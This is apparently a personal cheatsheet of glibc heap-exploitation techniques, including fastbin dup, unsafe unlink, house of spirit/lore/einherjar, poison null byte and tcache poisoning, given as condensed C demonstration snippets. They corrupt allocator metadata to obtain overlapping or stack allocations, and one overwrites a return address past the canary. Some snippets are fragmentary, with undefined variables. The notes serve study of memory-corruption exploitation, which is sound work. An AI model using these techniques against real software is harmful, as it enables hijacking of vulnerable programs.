---
title: "Binex Heap"
description: "Cheatsheet"
date: "2025-8-3"
---
## fastbin_dup
### prerequisites
- fill tcache (7 chunks)
### advantages
- can write to arbitrary address

```c
free(a);
// free(a); // would crash here
free(b);
free(a);

c = malloc();
d = malloc();
//heap is allocated and in the bins at the same time
e = malloc();
assert(c == e);
```

## fastbin_dup_into_stack
```c
free(heap);
free(a);
free(heap);
//double free

heap = malloc();
c = malloc();
//heap chunk is allocated and in the bins at the same time

unsigned long stack[4];
stack[1] = 0x20;

heap[0] = (heap >> 12) ^ &stack[2]; //control the next pointer to point to stack variable

heap = malloc(); // HEAD pointer points to stack variable

vuln = malloc(); // get the stack allocation

assert(vuln == &stack_var[2]);
```

## fastbin_dup_consolidate (idk)
```c
#define CHUNK_SIZE 0x400
//---
void *ptr[7];

void *p1 = malloc(0x40);

free(p1); // to fastbin

void *p2 = malloc(CHUNK_SIZE); // trigger consolidate
assert(p1 == p2);

free(p1); // vulnerability (double free)

void *p3 = malloc(CHUNK_SIZE);

assert(p3 == p2);
```
## unsafe_unlink
```c
int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
int header_size = 2;

chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

//fake free chunk inside chunk0
chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; //prev_size
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); //fd points to stack
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); //bk points to stack

uint64_t *chunk1_hdr = chunk1_ptr - header_size; //get chunk1 header
chunk1_hdr[0] = malloc_size; //prev_size
chunk1_hdr[1] &= ~1; //clear inuse bit
free(chunk1_ptr); // then, chunk0_ptr no longer points to heap

// unlink in the background
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2)
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
// yes, its overwritten twice

char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string; // chunk0_ptr = victim_string

chunk0_ptr[0] = 0x4141414142424242LL;
assert(*(long *)victim_string == 0x4141414142424242L);
```

## house_of_spirit
```c
long fake_chunks[10] __attribute__((aligned(0x10)));
fake_chunks[1] = 0x40; // size
fake_chunks[9] = 0x1234; // nextsize
void *victim = &fake_chunks[2];
free(victim); //to fastbin
void *allocated = calloc(1, 0x30); //from fastbin
```

## poison_null_byte
```c
void *tmp = malloc(0x1);
void *heap_base = (void *)((long)tmp & (~0xfff));
size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20; //to make fake address like 0x??0010
void *padding= malloc(size);

void *prev = malloc(0x500);
void *victim = malloc(0x4f0);
malloc(0x10);//barrier
void *a = malloc(0x4f0);
malloc(0x10);//barrier
void *b = malloc(0x510);
malloc(0x10);//barrier
puts("\ncurrent heap layout\n"
     "    ... ...\n"
     "padding\n"
     "    prev chunk(addr=0x??0010, size=0x510)\n"
     "  victim chunk(addr=0x??0520, size=0x500)\n"
     " barrier chunk(addr=0x??0a20, size=0x20)\n"
     "       a chunk(addr=0x??0a40, size=0x500)\n"
     " barrier chunk(addr=0x??0f40, size=0x20)\n"
     "       b chunk(addr=0x??0f60, size=0x520)\n"
     " barrier chunk(addr=0x??1480, size=0x20)\n");

// move them to the unsorted bin
free(a);
free(b);
free(prev);

malloc(0x1000); // move them from unsorted bin to the (sorted) largebin to reuse _nextsize as fd/bk later

void *prev2 = malloc(0x500); //reallocate prev
((long *)prev)[1] = 0x501; //construct fake chunk
*(long *)(prev + 0x500) = 0x500; //overwrite victim prev_size

void *b2 = malloc(0x510);
((char*)b2)[0] = '\x10';
((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk (0x??0010) [from 0x??0a40 (a)]

void *a2 = malloc(0x4f0);
free(a2); // to unsorted bin
free(victim); //to unsorted bin: a->bck = victim

void *a3 = malloc(0x4f0);
((char*)a3)[8] = '\x10';
((char*)a3)[9] = '\x00'; // a->bk <- fake_chunk (0x??0010) [from 0x??0520 (victim)]

((char *)victim2)[-8] = '\x00';//overwrite victim prev_size (again)

free(victim); // to unsorted bin, consolidate (merge) with prev

void *merged = malloc(0x100); // 0x??0020, prev2 (0x??0010)
memset(merged, 'a', 0x80);
memset(prev2, 'c', 0x80);
assert(strstr(merged, "CCCCCCCCC"));
```
## house_of_lore
```c

intptr_t *stack_buffer_1[4] = {0};
intptr_t *stack_buffer_2[4] = {0};
void *fake_freelist[7][4];

intptr_t *victim = malloc(0x100);

// for tcache
void *dummies[7];
for (int i = 0; i < 7; i++)
dummies[i] = malloc(0x100);

intptr_t *victim_chunk = victim - 2;

// prepare the fake freelist
for (int i = 0; i < 6; i++) {
fake_freelist[i][3] = fake_freelist[i + 1];
}
fake_freelist[6][3] = NULL;

// sb1.fd = victim_chunk;
// sb1 -> victim_chunk
stack_buffer_1[0] = 0;
stack_buffer_1[1] = 0;
stack_buffer_1[2] = victim_chunk;

// sb1.bk = stack_buffer_2;
// sb2.fd = stack_buffer_1;
// sb2.bk = fake_freelist[0];
// ff0 <-> sb2 <-> sb1
stack_buffer_1[3] = (intptr_t *)stack_buffer_2;
stack_buffer_2[2] = (intptr_t *)stack_buffer_1;
stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

//avoid the consolidation
void *p5 = malloc(1000);

// fill tcache
for (int i = 0; i < 7; i++)
free(dummies[i]);

// free victim to put it into the smallbin
free((void *)victim);


// idk
void *p2 = malloc(1200);
//------------VULNERABILITY-----------

// in the fastbin
victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

//------------------------------------
// empty the tcache
for (int i = 0; i < 7; i++)
malloc(0x100);

// move the fake freelist into the tcache
void *p3 = malloc(0x100);

// get the stack allocated
char *p4 = malloc(0x100);
intptr_t sc = (intptr_t)win; // Emulating our in-memory shellcode

long offset = (long)__builtin_frame_address(0) - (long)p4;
memcpy(
  (p4 + offset + 8), &sc,
  8); // This bypasses stack-smash detection since it jumps over the canary

// sanity check
assert((long)__builtin_return_address(0) == (long)win);
```
## overlaping_chunks
```c
long *p1,*p2,*p3,*p4;
p1 = malloc(0x80 - 8);
p2 = malloc(0x500 - 8);
p3 = malloc(0x80 - 8);

memset(p1, '1', 0x80 - 8);
memset(p2, '2', 0x500 - 8);
memset(p3, '3', 0x80 - 8);

int evil_chunk_size = 0x581;
int evil_region_size = 0x580 - 8;

/* VULNERABILITY */
*(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
/* VULNERABILITY */

free(p2);
p4 = malloc(evil_region_size); // overlapping chunk

// initially
printf("p4 = %s\n", (char *)p4);
printf("p3 = %s\n", (char *)p3);

// overwrite p3 via p4
memset(p4, '4', evil_region_size);
printf("p4 = %s\n", (char *)p4);
printf("p3 = %s\n", (char *)p3);

// overwrite p4 via p3
memset(p3, '3', 80);
printf("p4 = %s\n", (char *)p4);
printf("p3 = %s\n", (char *)p3);
```
## overlaping_chunks2
```c
intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
int prev_in_use = 0x1;

//setup
p1 = malloc(1000);
p2 = malloc(1000);
p3 = malloc(1000);
p4 = malloc(1000);
p5 = malloc(1000);

real_size_p1 = malloc_usable_size(p1);
real_size_p2 = malloc_usable_size(p2);
real_size_p3 = malloc_usable_size(p3);
real_size_p4 = malloc_usable_size(p4);
real_size_p5 = malloc_usable_size(p5);

//fill
memset(p1,'A',real_size_p1);
memset(p2,'B',real_size_p2);
memset(p3,'C',real_size_p3);
memset(p4,'D',real_size_p4);
memset(p5,'E',real_size_p5);

free(p4);//fooling allocator for the free(p2) later
*(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE  // p2->size = 0x7e1 (before: 0x3f1)
free(p2);//to unsorted bin

p6 = malloc(2000); // overlapping chunk with p3

fprintf(stderr, "%s\n",(char *)p3); 
memset(p6,'F',1500);  
fprintf(stderr, "%s\n",(char *)p3); 
```
## mmap_overlaping_chunks
```c
//setup
long long* top_ptr = malloc(0x100000);
long long* mmap_chunk_2 = malloc(0x100000);
long long* mmap_chunk_3 = malloc(0x100000);

printf("\nCurrent System Memory Layout \n" \
"================================================\n" \
"running program\n" \
"heap\n" \
"....\n" \
"third mmap chunk\n" \
"second mmap chunk\n" \
"LibC\n" \
"....\n" \
"ld\n" \
"first mmap chunk\n"
"===============================================\n\n" \
);

mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2; // mmap_chunk_3->prev_size = 0x202002
free(mmap_chunk_3); //merge
long long* overlapping_chunk = malloc(0x300000);// overlapping chunk with mmap_chunk_2
int distance = mmap_chunk_2 - overlapping_chunk;//0x40000

overlapping_chunk[distance] = 0x1122334455667788;
assert(mmap_chunk_2[0] == overlapping_chunk[distance]);
```
## house_of_einherjar
```c
intptr_t stack_var[0x10];
intptr_t *target = NULL;

// choose a properly aligned target address
for(int i=0; i<0x10; i++) {
    if(((long)&stack_var[i] & 0xf) == 0) {
        target = &stack_var[i];
        break;
    }
}

intptr_t *a = malloc(0x38);
// construct fake chunk
a[0] = 0;	// prev_size (Not Used)
a[1] = 0x60; // size
a[2] = (size_t) a; // fwd
a[3] = (size_t) a; // bck

uint8_t *b = (uint8_t *) malloc(0x28);
int real_b_size = malloc_usable_size(b);

uint8_t *c = (uint8_t *) malloc(0xf8);
uint64_t* c_size_ptr = (uint64_t*)(c - 8);
// VULNERABILITY
b[real_b_size] = 0; // c.prev_in_use = 0
// VULNERABILITY
size_t fake_size = (size_t)((c - sizeof(size_t) * 2) - (uint8_t*) a); // 0x60
*(size_t*) &b[real_b_size-sizeof(size_t)] = fake_size; // c.prev_size = 0x60

a[1] = fake_size; //just make sure

for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
    x[i] = malloc(0xf8);
}
for(int i=0; i<sizeof(x)/sizeof(intptr_t*); i++) {
    free(x[i]);
}

free(c); //merge c, b and fake_chunk

intptr_t *d = malloc(0x158); //merged chunk

// tcache poisoning
uint8_t *pad = malloc(0x28);
free(pad);
free(b);
d[0x30 / 8] = (long)target ^ ((long)&d[0x30/8] >> 12); // d->fd = target(stack)
malloc(0x28); //head points to target
intptr_t *e = malloc(0x28); // stack address allocated
```
## sysmalloc_int_free
```c
new = malloc(PROBE); // PROBE: 0x10
top_size = new[(PROBE / SIZE_SZ) + 1]; // top_size: 0x20ce1

allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
allocated_size &= PAGE_MASK;
allocated_size &= MALLOC_MASK;
new = malloc(allocated_size); // allocated_size: 0xb60

top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];
top_size = *top_size_ptr; // top_size: 0x20171

new_top_size = top_size & PAGE_MASK;
*top_size_ptr = new_top_size; // top_size: 0x00171 (corrupted) 

old = new;
new = malloc(CHUNK_FREED_SIZE + 0x10); // allocated in a new segment of heap, freed the old rest one and put it into smallbins

old = new;
new = malloc(FREED_SIZE); // get the freed chunk from smallbins
```
## tcache_poisoning
```c
size_t stack_var[0x10];
size_t *target = NULL;

for(int i=0; i<0x10; i++) {
    if(((long)&stack_var[i] & 0xf) == 0) {
        target = &stack_var[i];
        break;
    }
}
intptr_t *a = malloc(128);
intptr_t *b = malloc(128);
free(a);
free(b);

b[0] = (intptr_t)((long)target ^ (long)b >> 12); // b->fd = target(stack)
malloc(128)
intptr_t *c = malloc(128); // stack address allocated
assert((long)target == (long)c);
```
## tcache_house_of_spirit
```c
malloc(1);
unsigned long long *a; //pointer that will be overwritten
unsigned long long fake_chunks[10]; //fake chunk region

fake_chunks[1] = 0x40; // this is the size
a = &fake_chunks[2]; 
free(a); // tree the fake chunk from stack into the tcache
void *b = malloc(0x30); // get the stack address
```
